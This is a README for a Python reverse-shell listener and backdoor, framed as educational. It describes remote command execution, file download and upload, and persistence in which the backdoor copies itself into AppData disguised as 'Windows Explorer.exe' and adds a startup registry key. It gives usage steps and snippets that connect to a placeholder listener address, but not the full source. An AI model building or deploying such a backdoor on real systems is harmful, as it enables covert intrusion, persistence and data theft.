# Listener and Backdoor Python Scripts

These scripts demonstrate a listener and backdoor implementation for educational purposes. They are designed to illustrate basic concepts of network communication, remote file handling, and command execution in Python.

## **DISCLAIMER**

These scripts are provided strictly for **educational and ethical purposes**. Unauthorized use of these tools against systems without explicit permission is illegal and unethical. Ensure compliance with local laws and use them responsibly.

---

## **Listener Script**

### **Description**
The listener script acts as a server to establish a connection with a backdoor client. It allows the user to remotely execute commands, upload/download files, and manage the target system.

### **Features**
- Establishes a connection with a backdoor.
- Reliable communication using JSON.
- Remote command execution.
- File upload and download support.
- Error handling for robust execution.

### **Usage**
1. Set the target IP and PORT in the script:
   ```python
   my_listener = Listener("<LISTENER_IP>", <PORT>)
   my_listener.run()
   ```
2. Run the script on your machine.
3. Use the command prompt to interact with the connected backdoor.

### **Commands**
- `download <file_path>`: Downloads a file from the target system.
- `upload <file_path>`: Uploads a file to the target system.
- `cd <directory>`: Changes the working directory on the target system.
- `exit`: Closes the connection.

---

## **Backdoor Script**

### **Description**
The backdoor script acts as a client that connects to the listener. It enables the remote execution of commands, file handling, and directory management.

### **Features**
- Connects to the listener.
- Becomes persistent by adding itself to the system startup registry.
- Executes system commands.
- File upload and download support.
- Directory navigation.
- Robust error handling.

### **Usage**
1. Set the listener's IP and PORT in the script:
   ```python
   my_backdoor = Backdoor("<LISTENER_IP>", <PORT>)
   my_backdoor.run()
   ```
2. Run the script on the target system.

### **Persistence**
The backdoor script automatically copies itself to the `AppData` directory and creates a registry key for persistence:
```python
evil_file_location = os.environ["appdata"] + "\\Windows Explorer.exe"
```

---

## **Prerequisites**
- Python 3.x installed on both machines.
- Modules: `socket`, `json`, `base64`, `sys`, `os`, `subprocess`, `shutil`.

### **Installation**
1. Clone this repository or download the scripts.
2. Install dependencies:
   ```bash
   pip install -r requirements.txt
   ```

---

## **Example Interaction**

1. **Start the Listener**
   ```bash
   python listener.py
   ```
2. **Run the Backdoor on the Target**
   ```bash
   python backdoor.py
   ```
3. **Execute Commands**
   - Change directory:
     ```
     >> cd /target/path
     ```
   - Download a file:
     ```
     >> download secret.txt
     ```
   - Upload a file:
     ```
     >> upload payload.exe
     ```
   - Exit the session:
     ```
     >> exit
     ```

---

## **Security Notes**

- These scripts are potentially harmful and should only be used on systems you own or have explicit permission to test.
- Modify the scripts for legal use cases such as penetration testing or educational demonstrations.
- Never execute unknown or untrusted scripts on your system.

---

## **License**

MIT License. See `LICENSE` for more details.

---

For further learning, explore secure coding practices and ethical hacking courses.

